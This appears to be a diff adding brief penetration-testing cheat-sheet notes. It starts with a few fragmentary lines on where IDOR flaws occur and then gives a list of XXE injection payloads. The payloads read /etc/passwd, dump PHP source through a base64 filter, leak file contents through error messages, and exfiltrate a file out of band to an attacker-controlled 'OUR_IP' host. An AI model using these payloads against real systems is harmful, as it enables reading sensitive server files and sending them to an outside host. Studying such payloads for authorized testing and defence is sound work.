@@ -1,0 +1,18 @@
+#IDOR
+##being in...
+URL parameters and APIs
+AJAX Calls
+by reference hashing/encoding
+by comaping user roles
+
+#XXE
+##define external entity to a URL
+<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
+##define external entity to a file path
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+#read php source code with base64 encode filter
+<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+##reading a file through a PHP error
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+##reading a file OOB exfiltration
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
